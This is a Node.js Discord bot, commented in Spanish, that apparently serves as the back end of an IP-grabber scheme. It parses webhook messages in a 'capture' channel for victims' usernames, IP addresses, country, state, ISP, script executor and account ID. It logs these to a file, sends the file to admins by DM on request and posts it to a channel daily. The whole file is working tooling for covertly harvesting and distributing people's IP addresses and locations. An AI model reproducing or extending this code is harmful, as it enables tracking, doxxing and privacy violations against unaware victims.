const { Client, GatewayIntentBits, AttachmentBuilder, PermissionsBitField } = require("discord.js");
const fs = require("fs");
const path = require("path");

const TOKEN = process.env.TOKEN;
const CAPTURE_CHANNEL = "1437151487141740637";
const SEND_LOGS_CHANNEL = "1440773871254110300";

const LOG_FILE = path.join(__dirname, "logs_globales.txt");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ===============================
// 📌 PARSEAR MENSAJE DEL WEBHOOK
// ===============================
client.on("messageCreate", (msg) => {

    // aceptar mensajes de webhook, ignorar bots reales
    if (!msg.webhookId && msg.author.bot) return;
    if (msg.channel.id !== CAPTURE_CHANNEL) return;
    if (!msg.embeds.length) return;

    const embed = msg.embeds[0];

    // -------------------------------
    // 1. EXTRAER Nombre / Display
    // -------------------------------
    let Nombre = msg.content.match(/USUARIO:\s([^|]+)/)?.[1]?.trim() || "N/A";
    let Display = msg.content.match(/DISPLAY:\s(.+)$/)?.[1]?.trim() || "N/A";

    // -------------------------------
    // 2. EXTRAER IP
    // -------------------------------
    let IP =
        embed.fields[0]?.value.match(/```(.+?)```/)?.[1] ||
        "N/A";

    // -------------------------------
    // 3. EXTRAER UBICACIÓN
    // -------------------------------
    let Pais =
        embed.fields[1]?.value.match(/País:\s+```(.*?)```/)?.[1] ||
        "N/A";

    let Estado =
        embed.fields[1]?.value.match(/Estado:\s+```(.*?)```/)?.[1] ||
        "N/A";

    let ISP =
        embed.fields[1]?.value.match(/ISP:\s*(.+)/)?.[1]?.trim() ||
        "N/A";

    // -------------------------------
    // 4. EXTRAER SISTEMA
    // -------------------------------
    let Executor =
        embed.fields[2]?.value.match(/Executor:\s*(.+)/)?.[1]?.trim() ||
        "N/A";

    let Cuenta =
        embed.fields[2]?.value.match(/Cuenta:\s*(\d+)/)?.[1] ||
        "N/A";

    // -------------------------------
    // 5. GUARDAR LÍNEA
    // -------------------------------
    const linea = `${Nombre} | ${Display} | ${IP} | ${Pais} | ${Estado} | ${ISP} | ${Executor} | ${Cuenta}\n`;

    fs.appendFileSync(LOG_FILE, linea, "utf8");
});

// ===============================
// 📌 COMANDO MANUAL: !loggs
// ===============================
client.on("messageCreate", async (msg) => {
    if (msg.content !== "!loggs") return;

    if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator))
        return msg.reply("❌ No tienes permisos.");

    if (!fs.existsSync(LOG_FILE))
        return msg.reply("No hay logs guardados.");

    const file = new AttachmentBuilder(LOG_FILE);

    await msg.author.send({ content: "📄 Logs actuales:", files: [file] });
    msg.reply("📬 Enviados por DM.");
});

// ===============================
// 📌 ENVÍO AUTOMÁTICO DIARIO
// ===============================
function enviarLogsDiarios() {
    if (!fs.existsSync(LOG_FILE)) return;

    const canal = client.channels.cache.get(SEND_LOGS_CHANNEL);
    if (!canal) return;

    const file = new AttachmentBuilder(LOG_FILE);

    canal.send({
        content: "📊 **Reporte diario de registros:**",
        files: [file]
    });
}

// ejecutar cada 24 horas
setInterval(enviarLogsDiarios, 24 * 60 * 60 * 1000);

// ===============================
client.login(TOKEN);
